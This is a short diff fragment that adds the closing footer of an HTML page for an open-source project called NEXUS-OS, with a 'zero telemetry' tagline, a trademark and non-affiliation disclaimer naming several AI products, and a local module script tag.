+          Independent Open Source · Zero Telemetry
+        </div>
+      </div>
+
+      <div class="footer-disclaimer">
+        All product names, logos, brands, and trademarks cited (including Claude, Claude Code, Anthropic, Cursor, OpenAI, Codex, Google, Gemini, Microsoft, GitHub, Copilot, Trae, Zed, Windsurf, Ollama, Docker) are property of their respective owners. NEXUS-OS is an independent open-source project and is not affiliated with or endorsed by Anthropic, OpenAI, Microsoft, Google, or Anysphere. Nominative fair use for compatibility description only.
+      </div>
+    </div>
+  </footer>
+
+  <script type="module" src="/src/main.js"></script>
+</body>
+</html>
